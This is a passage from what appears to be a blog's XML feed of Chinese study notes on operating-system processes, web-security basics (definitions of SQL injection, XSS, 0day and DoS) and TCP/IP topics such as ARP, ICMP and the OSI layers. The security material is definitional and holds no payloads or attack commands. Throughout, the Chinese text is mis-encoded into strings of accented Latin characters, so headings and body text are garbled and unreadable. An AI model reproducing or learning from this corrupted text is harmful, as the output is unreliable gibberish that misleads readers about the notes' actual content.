title="è¿›ç¨‹"></a>è¿›ç¨‹</h2><p>ç£ç›˜ä¸Šçš„ç¨‹åºï¼Œå½“è¢«ç³»ç»Ÿæ‰§è¡Œæ—¶ï¼Œè¢«åŠ è½½è¿›å†…å­˜ï¼Œç„¶åæ”¾å…¥å¯„å­˜å™¨ï¼Œæœ€åè®©cpuæ‰§è¡Œï¼Œå°±å˜æˆäº†è¿›ç¨‹<br>progressã€‚ä¹Ÿå°±æ˜¯è¿è¡Œä¸­çš„ç¨‹åºã€‚</p><ul><li>è¿›ç¨‹è¿è¡Œæ—¶ï¼Œä¼šå¾—åˆ°4Gçš„è™šæ‹Ÿå†…å­˜ï¼Œæœ€é«˜çš„ä¸€ä¸ªGä¸ºå†…æ ¸å†…å­˜ï¼Œå‰©ä¸‹ä¸‰ä¸ªGä¸ºç”¨æˆ·å†…å­˜ã€‚</li></ul><h2 id="æ˜ å°„"><a href="#æ˜ å°„" class="headerlink" title="æ˜ å°„"></a>æ˜ å°„</h2><p>æŠŠä¸€ä¸ªåœ°å€è¿æ¥åˆ°å¦ä¸€ä¸ªåœ°å€ã€‚å¦‚ï¼Œå†…å­˜å•å…ƒAçš„åœ°å€ä¸ºXï¼ŒæŠŠå®ƒæ˜ å°„åˆ°åœ°å€Yï¼Œè¿™æ ·è®¿é—®Yæ—¶ï¼Œå°±å¯ä»¥è®¿é—®åˆ°Aäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç™½å¸½å­è®² Web å®‰å…¨</title>
    <link href="/2022/08/25/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20Web%20%E5%AE%89%E5%85%A8/"/>
    <url>/2022/08/25/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20Web%20%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<hr><h1 id="ç¬¬ä¸€ç« "><a href="#ç¬¬ä¸€ç« " class="headerlink" title="ç¬¬ä¸€ç« "></a>ç¬¬ä¸€ç« </h1><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><p>SQL Injectionã€‚<br>æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚</p><p>è¿™ä¸ªæ³¨å…¥ï¼Œå°±æ˜¯æ’å…¥ä»£ç çš„æ„æ€ã€‚</p><h2 id="XSSæ”»å‡»"><a href="#XSSæ”»å‡»" class="headerlink" title="XSSæ”»å‡»"></a>XSSæ”»å‡»</h2><hr><p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065">å‚è€ƒç™¾ç§‘</a></p><hr><p>Cross Site Scripting, è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œç¼©å†™ä¸ºCSS.</p><p>ä½†å®¹æ˜“ä¸å±‚å æ ·å¼è¡¨Cascading Style Sheets, CSSï¼Œæ··æ·†äºæ˜¯ç¼©å†™ä¸ºXSSã€‚</p><p>å…¶åŸç†æ˜¯åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œæ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œã€‚</p><h2 id="å®‰å…¨æœ¬è´¨"><a href="#å®‰å…¨æœ¬è´¨" class="headerlink" title="å®‰å…¨æœ¬è´¨"></a>å®‰å…¨æœ¬è´¨</h2><p>å®‰å…¨æ£€æŸ¥ï¼Œä¿¡ä»»åŸŸï¼Œä¿¡ä»»è¾¹ç•Œã€‚</p><p>å®‰å…¨çš„æœ¬è´¨æ˜¯ä¿¡ä»»çš„é—®é¢˜ã€‚</p><p>å¯¹æ¡ä»¶çš„ä¿¡ä»»ç¨‹åº¦ï¼Œæ˜¯ç¡®å®šå¯¹è±¡æ˜¯å¦å®‰å…¨çš„åŸºç¡€ã€‚</p><h3 id="é“¶å¼¹"><a href="#é“¶å¼¹" class="headerlink" title="é“¶å¼¹"></a>é“¶å¼¹</h3><p>åªèƒ½ç”¨é“¶å¼¹(é“¶è´¨å­å¼¹)æ‰èƒ½æ¶ˆç­ç‹¼äººã€‚</p><h3 id="0dayæ¼æ´"><a href="#0dayæ¼æ´" class="headerlink" title="0dayæ¼æ´"></a>0dayæ¼æ´</h3><p>æŒ‡é‚£äº›æ²¡æœ‰è¢«å…¬å¼€è¿‡ï¼Œå› è€Œä¹Ÿæ²¡æœ‰è¡¥ä¸çš„æ¼æ´ã€‚</p><p>æ—©æœŸè¡¨ç¤ºåœ¨è½¯ä»¶å‘è¡Œå24å°æ—¶å†…å°±å‡ºç°ç ´è§£ç‰ˆæœ¬ã€‚</p><p>ç°åœ¨çš„å¼•ç”³å«ä¹‰ï¼Œåªè¦æ˜¯åœ¨è½¯ä»¶æˆ–è€…å…¶ä»–ä¸œè¥¿å‘å¸ƒåï¼Œåœ¨æœ€çŸ­æ—¶é—´å†…å‡ºç°ç›¸å…³ç ´è§£çš„ï¼Œéƒ½å¯ä»¥å«0dayã€‚</p><h3 id="Pwn2own"><a href="#Pwn2own" class="headerlink" title="Pwn2own"></a>Pwn2own</h3><hr><p><a href="https://baike.baidu.com/item/pwn2own/4242990">å‚è€ƒç™¾ç§‘</a></p><hr><p>Pwn2ownæ˜¯å…¨ä¸–ç•Œæœ€è‘—åã€å¥–é‡‘æœ€ä¸°åšçš„é»‘å®¢å¤§èµ›ã€‚</p><h3 id="å®‰å…¨ä¸‰è¦ç´ "><a href="#å®‰å…¨ä¸‰è¦ç´ " class="headerlink" title="å®‰å…¨ä¸‰è¦ç´ "></a>å®‰å…¨ä¸‰è¦ç´ </h3><p>CIA, Confidentiality Integrity Availability. æœºå¯†æ€§ï¼Œ å®Œæ•´æ€§ï¼Œ å¯ç”¨æ€§ã€‚</p><h3 id="æ•°å­—ç­¾å"><a href="#æ•°å­—ç­¾å" class="headerlink" title="æ•°å­—ç­¾å"></a>æ•°å­—ç­¾å</h3><h3 id="DoSæ”»å‡»"><a href="#DoSæ”»å‡»" class="headerlink" title="DoSæ”»å‡»"></a>DoSæ”»å‡»</h3><p>Denial of Service, æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ç ´åå®‰å…¨çš„å¯ç”¨æ€§ã€‚</p><p>ä¸€ç§è¿œç¨‹æ”»å‡»çš„å½¢å¼ã€‚</p><p>æ˜¯ä¸€ç§å¸¸ç”¨æ¥ä½¿æœåŠ¡å™¨æˆ–ç½‘ç»œç˜«ç—ªçš„ç½‘ç»œæ”»å‡»æ‰‹æ®µã€‚</p><p>DDoS, Distributed Denial Service, åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œæˆ–ç§°æ´ªæ°´æ”»å‡»ã€‚</p><p>å…¶åˆ©ç”¨ç½‘ç»œä¸Šå·²è¢«æ”»é™·çš„ç”µè„‘ä½œä¸ºâ€œåƒµå°¸â€ï¼Œå‘æŸä¸€ç‰¹å®šçš„ç›®æ ‡ç”µè„‘å‘åŠ¨å¯†é›†å¼çš„â€œæ‹’ç»æœåŠ¡â€è¦æ±‚ï¼Œç”¨ä»¥æŠŠç›®æ ‡ç”µè„‘çš„ç½‘ç»œèµ„æºåŠç³»ç»Ÿèµ„æºè€—å°½ï¼Œä½¿ä¹‹æ— æ³•å‘çœŸæ­£æ­£å¸¸è¯·æ±‚çš„ç”¨æˆ·æä¾›æœåŠ¡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å›¾è§£ TCPIP.md</title>
    <link href="/2022/08/25/%E5%9B%BE%E8%A7%A3%20TCPIP/"/>
    <url>/2022/08/25/%E5%9B%BE%E8%A7%A3%20TCPIP/</url>
    
    <content type="html"><![CDATA[<h2 id="5-3-ARP"><a href="#5-3-ARP" class="headerlink" title="5.3 ARP"></a>5.3 ARP</h2><h3 id="5-3-1-ARP-æ¦‚è¦"><a href="#5-3-1-ARP-æ¦‚è¦" class="headerlink" title="5.3.1 ARP æ¦‚è¦"></a>5.3.1 ARP æ¦‚è¦</h3><p>ä»¥ç›®æ ‡ IP åœ°å€ä¸ºçº¿ç´¢, ç”¨æ¥å®šä½ä¸‹ä¸€ä¸ªåº”è¯¥æ¥æ”¶æ•°æ®åˆ†åŒ…çš„ç½‘ç»œè®¾å¤‡å¯¹åº”çš„ MAC åœ°å€.</p><p>ARP åªé€‚ç”¨äº IPv4, ä¸èƒ½ç”¨äº IPv6. IPv6 ä¸­å¯ä»¥ç”¨ ICMPv6 æ›¿ä»£ ARP å‘é€é‚»å±…æ¢ç´¢æ¶ˆæ¯.</p><h3 id="5-3-2-ARP-çš„å·¥ä½œæœºåˆ¶"><a href="#5-3-2-ARP-çš„å·¥ä½œæœºåˆ¶" class="headerlink" title="5.3.2 ARP çš„å·¥ä½œæœºåˆ¶"></a>5.3.2 ARP çš„å·¥ä½œæœºåˆ¶</h3><p>ARP å€ŸåŠ©:</p><ul><li>ARP è¯·æ±‚ (è¯·æ±‚è·å– MAC åœ°å€)</li><li>ARP å“åº” (è¿”å› MAC åœ°å€)<br>ä¸¤ç§ç±»å‹çš„åŒ…ç¡®å®š MAC åœ°å€.</li></ul><p>é€šè¿‡å¹¿æ’­å‘é€ ARP è¯·æ±‚åŒ…, è¿™ä¸ªåŒ…ä¸­åŒ…å«äº†æƒ³è¦äº†è§£å…¶ MAC åœ°å€çš„ä¸»æœº IP åœ°å€.</p><p>ARP è¯·æ±‚åŒ…è¿˜æœ‰ä¸€ä¸ªä½œç”¨å°±æ˜¯å°†è‡ªå·±çš„ MAC åœ°å€å‘Šè¯‰ç»™å¯¹æ–¹.</p><p>é€šå¸¸è·å–åˆ°çš„ MAC åœ°å€ä¼šç¼“å­˜ä¸€æ®µæ—¶é—´. ä»¥æ˜ å°„å…³ç³»å­˜å‚¨åœ¨ ARP ç¼“å­˜è¡¨.</p><h3 id="5-3-3-IP-åœ°å€å’Œ-MAC-åœ°å€ç¼ºä¸€ä¸å¯"><a href="#5-3-3-IP-åœ°å€å’Œ-MAC-åœ°å€ç¼ºä¸€ä¸å¯" class="headerlink" title="5.3.3 IP åœ°å€å’Œ MAC åœ°å€ç¼ºä¸€ä¸å¯?"></a>5.3.3 IP åœ°å€å’Œ MAC åœ°å€ç¼ºä¸€ä¸å¯?</h3><h2 id="5-4-ICMP-Internet-Control-Message-Protocol"><a href="#5-4-ICMP-Internet-Control-Message-Protocol" class="headerlink" title="5.4 ICMP (Internet Control Message Protocol)"></a>5.4 ICMP (Internet Control Message Protocol)</h2><h3 id="5-3-4-RARP-Reverse-Address-Resolution-Protocol"><a href="#5-3-4-RARP-Reverse-Address-Resolution-Protocol" class="headerlink" title="5.3.4 RARP (Reverse Address Resolution Protocol)"></a>5.3.4 RARP (Reverse Address Resolution Protocol)</h3><p>ä» MAC åœ°å€å®šä½ IP åœ°å€çš„ä¸€ç§åè®®.</p><h3 id="5-4-1-è¾…åŠ©-IP-çš„-ICMP"><a href="#5-4-1-è¾…åŠ©-IP-çš„-ICMP" class="headerlink" title="5.4.1 è¾…åŠ© IP çš„ ICMP"></a>5.4.1 è¾…åŠ© IP çš„ ICMP</h3><p>ICMP çš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬, ç¡®è®¤ IP åŒ…æ˜¯å¦æˆåŠŸé€è¾¾ç›®æ ‡åœ°å€, é€šçŸ¥åœ¨å‘é€è¿‡ç¨‹å½“ä¸­ IP åŒ…è¢«åºŸå¼ƒçš„å…·ä½“åŸå› , æ”¹å–„ç½‘ç»œè®¾ç½®ç­‰.</p><p>ICMP çš„é€šçŸ¥æ¶ˆæ¯ä¼šä½¿ç”¨ IP è¿›è¡Œå‘é€.</p><p>ICMP çš„æ¶ˆæ¯å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç±»:</p><ul><li>ä¸€ç±»æ˜¯é€šçŸ¥å‡ºé”™åŸå› çš„é”™è¯¯æ¶ˆæ¯</li><li>å¦ä¸€ç±»æ˜¯ç”¨äºè¯Šæ–­çš„æŸ¥è¯¢æ¶ˆæ¯</li></ul><h3 id="5-4-2-ä¸»è¦çš„-ICMP-æ¶ˆæ¯"><a href="#5-4-2-ä¸»è¦çš„-ICMP-æ¶ˆæ¯" class="headerlink" title="5.4.2 ä¸»è¦çš„ ICMP æ¶ˆæ¯"></a>5.4.2 ä¸»è¦çš„ ICMP æ¶ˆæ¯</h3><p>IP è·¯ç”±å™¨æ— æ³•å°† IP æ•°æ®åŒ…å‘é€ç»™ç›®æ ‡åœ°å€æ—¶, ä¼šç»™å‘é€ç«¯ä¸»æœºè¿”å›ä¸€ä¸ªç›®æ ‡ä¸å¯è¾¾ (Destination Unreachable Message) çš„ ICMP çš„ä¿¡æ¯, å¹¶åœ¨è¿™ä¸ªæ¶ˆæ¯ä¸­æ˜¾ç¤ºä¸å¯è¾¾çš„å…·ä½“åŸå› .</p><h4 id="ICMP-é‡å®šå‘æ¶ˆæ¯"><a href="#ICMP-é‡å®šå‘æ¶ˆæ¯" class="headerlink" title="ICMP é‡å®šå‘æ¶ˆæ¯"></a>ICMP é‡å®šå‘æ¶ˆæ¯</h4><p>è¿”å›æ›´åˆé€‚çš„è·¯ç”±ä¿¡æ¯.</p><h4 id="ICMP-è¶…æ—¶ä¿¡æ¯"><a href="#ICMP-è¶…æ—¶ä¿¡æ¯" class="headerlink" title="ICMP è¶…æ—¶ä¿¡æ¯"></a>ICMP è¶…æ—¶ä¿¡æ¯</h4><p>TTL (Time To Live) çš„å€¼å‡åˆ° 0 æ—¶ IP åŒ…ä¼šè¢«ä¸¢å¼ƒ.</p><p>æ­¤æ—¶, IP è·¯ç”±å™¨å°†ä¼šå‘é€ä¸€ä¸ª ICMP è¶…æ—¶çš„æ¶ˆæ¯ç»™å‘é€ç«¯ä¸»æœº,å¹¶é€šçŸ¥è¯¥åŒ…å·²è¢«ä¸¢å¼ƒ.</p><p>è®¾ç½® TTL å¯ä»¥é¿å…å¾ªç¯. æœ‰æ—¶å¯ç”¨äºæ§åˆ¶åŒ…çš„åˆ°è¾¾èŒƒå›´ .</p><p><code>traceroute</code> å‘½ä»¤, å¯ä»¥æ˜¾ç¤ºå‡ºç”±æ‰§è¡Œç¨‹åºçš„ä¸»æœºåˆ°è¾¾ç‰¹å®šä¸»æœºä¹‹é—´å†ç»å¤šå°‘è·¯ç”±å™¨. åŸç†å°±æ˜¯åˆ©ç”¨ IP åŒ…çš„ç”Ÿå­˜æœŸé™ä» 1 å¼€å§‹æŒ‰ç…§é¡ºåºé€’å¢çš„åŒæ—¶å‘é€ UDP åŒ….</p><p>ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ traceroute ç›®æ ‡ä¸»æœºåœ°å€<br></code></pre></td></tr></table></figure><h4 id="ICMP-å›é€æ¶ˆæ¯"><a href="#ICMP-å›é€æ¶ˆæ¯" class="headerlink" title="ICMP å›é€æ¶ˆæ¯"></a>ICMP å›é€æ¶ˆæ¯</h4><p><code>ping</code> å‘½ä»¤ä¾é æ­¤æ¶ˆæ¯å®ç°. åˆ¤æ–­æ‰€å‘é€çš„æ•°æ®åŒ…æ˜¯å¦å·²ç»æˆåŠŸåˆ°è¾¾å¯¹ç«¯çš„ä¸€ç§æ¶ˆæ¯.</p><h2 id="å¯¹åè®®çš„ç†è§£"><a href="#å¯¹åè®®çš„ç†è§£" class="headerlink" title="å¯¹åè®®çš„ç†è§£"></a>å¯¹åè®®çš„ç†è§£</h2><p>åè®®æ˜¯ä¿¡æ¯ä¼ é€’çš„è§„èŒƒï¼Œåªæœ‰ä¸¤å°è®¡ç®—æœºä½¿ç”¨ç›¸åŒçš„åè®®è¿›è¡Œäº¤æµï¼Œæ•°æ®æ‰èƒ½å¤Ÿè¢«ä¼ è¾¾ã€‚</p><h2 id="åˆ†ç»„äº¤æ¢åè®®"><a href="#åˆ†ç»„äº¤æ¢åè®®" class="headerlink" title="åˆ†ç»„äº¤æ¢åè®®"></a>åˆ†ç»„äº¤æ¢åè®®</h2><p>æ•°æ®è¢«æ‹†åˆ†ä¸ºåŒ…ï¼ŒåŒ…ä¸Šæœ‰æŠ¥æ–‡é¦–éƒ¨ï¼Œå«æœ‰åŸä¸»æœºåœ°å€ï¼Œç›®çš„ä¸»æœºåœ°å€ç­‰ä¿¡æ¯ã€‚</p><h2 id="åè®®åˆ†å±‚"><a href="#åè®®åˆ†å±‚" class="headerlink" title="åè®®åˆ†å±‚"></a>åè®®åˆ†å±‚</h2><p>æ¯ä¸ªåˆ†å±‚æ¥å—å®ƒçš„ä¸‹ä¸€å±‚æä¾›çš„æœåŠ¡å¹¶å‘å®ƒè‡ªå·±çš„ä¸Šä¸€å±‚æä¾›æœåŠ¡ã€‚å°±æ˜¯åº•å±‚å‘ä¸Šå±‚æœåŠ¡ã€‚</p><p>ä¾¿äºåŒºåˆ†åŠŸèƒ½ã€‚</p><p>å±‚ä¸å±‚ä¹‹é—´æœ‰æ¥å£ï¼ŒåŒå±‚ä¹‹é—´æœ‰åè®®ã€‚</p><p>é€šè¿‡OSIå‚è€ƒæ¨¡å‹ï¼Œå¯ä»¥å¾—çŸ¥æ¯ä¸€å±‚å¤§è‡´çš„ä½œç”¨ã€‚</p><p>OSIå„å±‚çš„ä½œç”¨ï¼š</p><ul><li>åº”ç”¨å±‚ï¼Œç¡®å®šæ•°æ®å†…å®¹ï¼Œå‘é€è€…ï¼Œç›®çš„åœ°å€</li><li>è¡¨ç¤ºå±‚ï¼Œç”¨äºæ•°æ®çš„ä¸»æœºç‰¹æœ‰æ ¼å¼å’Œç½‘ç»œç»Ÿä¸€æ ¼å¼çš„è½¬æ¢ã€‚å³æ ¼å¼åŒ–ç¼–ç ã€‚</li><li>ä¼šè¯å±‚ï¼Œç¡®å®šä¸»æœºé—´çš„è¿æ¥æ–¹å¼ï¼Œå»ºç«‹å‡ æ¬¡è¿æ¥ä¹‹ç±»ã€‚å³æ ‡è®°å‘é€é¡ºåºã€‚ç®¡ç†ä½•æ—¶å»ºç«‹è¿æ¥ï¼Œä½•æ—¶å‘é€æ•°æ®ã€‚</li><li>ä¼ è¾“å±‚ï¼Œè¿›è¡Œå®é™…ä¸Šè¿æ¥çš„å»ºç«‹å’Œæ–­å¼€ã€‚ç¡®ä¿æ•°æ®ä¼ é€è‡³ç›®çš„åœ°ï¼Œæ²¡æœ‰åˆ°è¾¾åˆ™é‡å‘ã€‚<em><strong>å¯èƒ½è¿™é‡Œå°±æ˜¯ä¸€æ¬¡æ¡æ‰‹å‘ç”Ÿçš„åœ°æ–¹ã€‚</strong></em>æ‰€ä»¥ä¼ è¾“å±‚çš„ä½œç”¨æ˜¯ç¡®ä¿é€šä¿¡çš„å¯é æ€§ã€‚é€»è¾‘ä¸Šçš„è¿æ¥ã€‚</li><li>ç½‘ç»œå±‚ï¼Œè´Ÿè´£å°†æ•°æ®å‘é€è‡³æœ€ç»ˆç›®æ ‡åœ°å€ã€‚</li><li>æ•°æ®é“¾è·¯å±‚ï¼Œè´Ÿè´£ä¼ è¾“ä»‹è´¨è®¾å¤‡ä¹‹é—´çš„æ•°æ®å¤„ç†ã€‚ç‰©ç†ä¸Šçš„è¿æ¥</li><li>ç‰©ç†å±‚ï¼Œå°†æ•°æ®çš„0ï¼Œ1è½¬æ¢ä¸ºç”µå‹å’Œè„‰å†²å…‰ä¼ é€ç»™ç‰©ç†çš„ä¼ è¾“ä»‹è´¨ã€‚</li></ul><p>MACåœ°å€(media access controlä»‹è´¨è®¿é—®æ§åˆ¶)ï¼Œå³ç‰©ç†åœ°å€ã€ç¡¬ä»¶åœ°å€ã€‚</p><h3 id="å¯¹å„å±‚ä½œç”¨çš„ç†è§£"><a href="#å¯¹å„å±‚ä½œç”¨çš„ç†è§£" class="headerlink" title="å¯¹å„å±‚ä½œç”¨çš„ç†è§£"></a>å¯¹å„å±‚ä½œç”¨çš„ç†è§£</h3><p>å¯èƒ½æ˜¯æ¯ä¸€å±‚å°†è‡ªå·±çš„å·¥ä½œæˆæœæ ‡è®°åœ¨è¡¨å¤´æŠ¥æ–‡ä¸­ï¼Œç„¶åæ¥æ”¶æ–¹ä¸€ä¸€è§£æè¿™äº›æŠ¥æ–‡ã€‚</p><h2 id="ä¼ è¾“æ–¹å¼"><a href="#ä¼ è¾“æ–¹å¼" class="headerlink" title="ä¼ è¾“æ–¹å¼"></a>ä¼ è¾“æ–¹å¼</h2><p>ä¸¤ç§ï¼š</p><blockquote><ul><li>é¢å‘è¿æ¥</li><li>é¢å‘æ— è¿æ¥</li></ul></blockquote><p>åˆ†ç»„äº¤æ¢ï¼Œæ¯ä¸ªåŒ…ä¸Šæ ‡è®°æœ‰å‘é€ç«¯å’Œæ¥å—ç«¯çš„åœ°å€ã€‚</p><p>ä¼ è¾“é€Ÿç‡åˆç§°<strong>å®½å¸¦</strong><br>ä¸»æœºä¹‹é—´å®é™…çš„ä¼ è¾“é€Ÿç‡ç§°ä¸ºååé‡<br>ç‰©ç†è®¾å¤‡çš„å…¼å®¹æ€§å¾ˆé‡è¦ã€‚<br>è®¡ç®—æœºä¸å¤–ç•Œè¿æ¥çš„æ¥å£ç§°ä½œç«¯å£ã€‚</p><h2 id="ç½‘ç»œè®¾å¤‡"><a href="#ç½‘ç»œè®¾å¤‡" class="headerlink" title="ç½‘ç»œè®¾å¤‡"></a>ç½‘ç»œè®¾å¤‡</h2><h3 id="ç½‘å¡"><a href="#ç½‘å¡" class="headerlink" title="ç½‘å¡"></a>ç½‘å¡</h3><p>ç”¨äºæ¥å…¥ç½‘ç»œã€‚</p><h3 id="ä¸­ç»§å™¨"><a href="#ä¸­ç»§å™¨" class="headerlink" title="ä¸­ç»§å™¨"></a>ä¸­ç»§å™¨</h3><p>ä½äºOSIæ¨¡å‹çš„ç‰©ç†å±‚ã€‚<br>å¯¹ç”µä¿¡å·æˆ–å…‰ä¿¡å·è¿›è¡Œæ³¢å½¢è°ƒæ•´å’Œæ”¾å¤§ã€‚<br>ç”¨äºå»¶é•¿ç½‘ç»œã€‚<br>ä¿¡å·åœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­ä¼šå‡å¼±ï¼Œä¸­ç»§å™¨å°±æ˜¯æŠŠä¿¡å·è°ƒæ•´æ­£å¸¸å’ŒåŠ å¼ºã€‚</p><h3 id="é›†çº¿å™¨"><a href="#é›†çº¿å™¨" class="headerlink" title="é›†çº¿å™¨"></a>é›†çº¿å™¨</h3><p>å¤šå£ä¸­ç»§å™¨ã€‚</p><h3 id="ç½‘æ¡¥"><a href="#ç½‘æ¡¥" class="headerlink" title="ç½‘æ¡¥"></a>ç½‘æ¡¥</h3><p>ä½äºOSIæ¨¡å‹çš„ç¬¬äºŒå±‚ï¼Œæ•°æ®é“¾è·¯å±‚ã€‚å¯å­˜å‚¨æ•°æ®å¸§ï¼Œè¿æ¥ç½‘æ®µã€‚å¯å­¦ä¹ ã€‚<br>åˆç§°2å±‚äº¤æ¢æœºã€‚<br>å…·æœ‰ç½‘æ¡¥åŠŸèƒ½çš„Hubå«åšäº¤æ¢é›†çº¿å™¨ï¼Œåªæœ‰ä¸­ç»§å™¨åŠŸèƒ½çš„Hubå«é›†çº¿å™¨ã€‚</p><h3 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h3><p>ä½äºOSIæ¨¡å‹çš„ç¬¬ä¸‰å±‚ï¼Œç½‘ç»œå±‚ï¼Œå¯ä»¥è¿æ¥ä¸åŒçš„æ•°æ®é“¾è·¯ã€‚<br>ç½‘æ¡¥æ˜¯æ ¹æ®MACåœ°å€è¿›è¡Œå¤„ç†ï¼Œè·¯ç”±å™¨æ˜¯æ ¹æ®IPåœ°å€è¿›è¡Œå¤„ç†ã€‚</p><h3 id="4ï½7å±‚äº¤æ¢æœº"><a href="#4ï½7å±‚äº¤æ¢æœº" class="headerlink" title="4ï½7å±‚äº¤æ¢æœº"></a>4ï½7å±‚äº¤æ¢æœº</h3><p>å¤„ç†ä¼ è¾“å±‚ä»¥ä¸Šã€‚å…¶åŒ…å«è´Ÿè½½å‡è¡¡å™¨ã€‚</p><h3 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h3><p>äº¤æ¢æœºå†…éƒ¨æœ‰ä¸€å¼ MACåœ°å€è¡¨ï¼Œè®°å½•æ¯ä¸€ä¸ªMACåœ°å€çš„è®¾å¤‡ï¼Œè¿æ¥åœ¨å…¶å“ªä¸€ä¸ªç«¯å£ã€‚</p><h3 id="ç½‘å…³"><a href="#ç½‘å…³" class="headerlink" title="ç½‘å…³"></a>ç½‘å…³</h3><p>åè®®çš„è½¬æ¢ä¸æ•°æ®çš„æ”¶å‘ã€‚</p><h2 id="ä»¥å¤ªç½‘"><a href="#ä»¥å¤ªç½‘" class="headerlink" title="ä»¥å¤ªç½‘"></a>ä»¥å¤ªç½‘</h2><p>é€šè¿‡äº¤æ¢æœºå°èŒƒå›´ä¼ è¾“æ•°æ®çš„ç½‘ç»œã€‚</p><h2 id="ç½‘ç»œæµé‡"><a href="#ç½‘ç»œæµé‡" class="headerlink" title="ç½‘ç»œæµé‡"></a>ç½‘ç»œæµé‡</h2><p>ç½‘ç»œä¸Šä¼ è¾“çš„æ•°æ®æŠ¥æ–‡çš„æ•°é‡ã€‚</p><h2 id="äº‘"><a href="#äº‘" class="headerlink" title="äº‘"></a>äº‘</h2><p>åŠ¨æ€è°ƒæ•´ã€‚</p><h3 id="å®¢æˆ·ç«¯-x2F-æœåŠ¡ç«¯æ¨¡å‹"><a href="#å®¢æˆ·ç«¯-x2F-æœåŠ¡ç«¯æ¨¡å‹" class="headerlink" title="å®¢æˆ·ç«¯&#x2F;æœåŠ¡ç«¯æ¨¡å‹"></a>å®¢æˆ·ç«¯&#x2F;æœåŠ¡ç«¯æ¨¡å‹</h3><h1 id="æ¥è‡ªçŸ¥ä¹ä¸Šä¸€ä¸ªå›ç­”çš„ç†è§£"><a href="#æ¥è‡ªçŸ¥ä¹ä¸Šä¸€ä¸ªå›ç­”çš„ç†è§£" class="headerlink" title="æ¥è‡ªçŸ¥ä¹ä¸Šä¸€ä¸ªå›ç­”çš„ç†è§£"></a>æ¥è‡ªçŸ¥ä¹ä¸Šä¸€ä¸ªå›ç­”çš„ç†è§£</h1><p>è·¯ç”±å™¨çš„æ¯ä¸€ä¸ªç«¯å£ï¼Œéƒ½æœ‰ç‹¬ç«‹çš„MACåœ°å€ã€‚</p><h2 id="è‡ªæˆ‘ç†è§£"><a href="#è‡ªæˆ‘ç†è§£" class="headerlink" title="è‡ªæˆ‘ç†è§£"></a>è‡ªæˆ‘ç†è§£</h2><p>é›†çº¿å™¨é›†ä¸»æœºçš„çº¿ï¼Œäº¤æ¢æœºæ˜¯é«˜çº§çš„é›†çº¿å™¨ï¼Œè·¯ç”±å™¨é›†äº¤æ¢æœºçš„çº¿ã€‚</p><h2 id="MACåœ°å€"><a href="#MACåœ°å€" class="headerlink" title="MACåœ°å€"></a>MACåœ°å€</h2><p>ä¸€èˆ¬48ä½ï¼Œå‰24ä½ä»£è¡¨ç½‘ç»œç¡¬ä»¶åˆ¶é€ å•†çš„ç¼–å·ï¼Œå24ä½æ˜¯å‚å®¶è‡ªå·±åˆ†é…çš„ï¼Œä¸€èˆ¬è¡¨ç¤ºç³»åˆ—å·ã€‚</p><p>é€šè¿‡IPå·å¯ä»¥å®ç°å‘ä¸€ä¸ªåŒºåŸŸå†…çš„ä¸»æœºå‘é€æ•°æ®ã€‚</p><p>æŠ¥æ–‡é¦–éƒ¨ç”±å‡ ä¸ªå¤´éƒ¨ç»„æˆï¼Œæ¯”å¦‚ç½‘ç»œå±‚å¤´éƒ¨ï¼Œæ•°æ®é“¾è·¯å±‚å¤´éƒ¨ã€‚</p><h2 id="IPåœ°å€ä½œç”¨"><a href="#IPåœ°å€ä½œç”¨" class="headerlink" title="IPåœ°å€ä½œç”¨"></a>IPåœ°å€ä½œç”¨</h2><p>ä¾¿äºå°†ä¿¡æ¯å‘é€ç»™ä¸€ç¾¤è®¾å¤‡ã€‚<br>IPåœ°å€å¯ä»¥éšæ—¶ä¿®æ”¹ã€‚</p><h2 id="å­ç½‘çš„ä½œç”¨"><a href="#å­ç½‘çš„ä½œç”¨" class="headerlink" title="å­ç½‘çš„ä½œç”¨"></a>å­ç½‘çš„ä½œç”¨</h2><p>å¦‚æœæºIPä¸ç›®æ ‡IPå¤„äºä¸€ä¸ªå­ç½‘ï¼Œç›´æ¥å°†åŒ…é€šè¿‡äº¤æ¢æœºå‘å‡ºã€‚<br>å¦‚æœæºIPä¸ç›®æ ‡IPä¸å¤„äºä¸€ä¸ªå­ç½‘ï¼Œåˆ™äº¤ç»™è·¯ç”±å™¨å¤„ç†ã€‚<br>å­ç½‘å·å°±æ˜¯IPåœ°å€ä¸­çš„ç½‘ç»œå·ã€‚<br>å­ç½‘æ©ç 